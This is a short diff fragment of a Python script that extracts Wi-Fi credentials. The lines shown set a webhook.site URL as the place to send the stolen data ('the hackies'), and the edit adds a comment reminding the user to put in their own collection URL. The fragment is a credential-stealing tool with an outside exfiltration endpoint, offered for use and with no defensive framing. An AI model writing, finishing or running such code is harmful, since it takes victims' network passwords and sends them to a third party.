@@ -3,8 +3,8 @@ import os
 import requests
 import xml.etree.ElementTree as ET
 
-#url to send the hackies
-url = "https://webhook.site/27249c99-075e-4c63-a394-ce0b684d65a2"
+# url to send the hackies
+url = "https://webhook.site/27249c99-075e-4c63-a394-ce0b684d65a2" # remember to replace the url with the url you want the hackies on
 
 # Function to extract Wi-Fi credentials
 def extract_wifi_credentials():
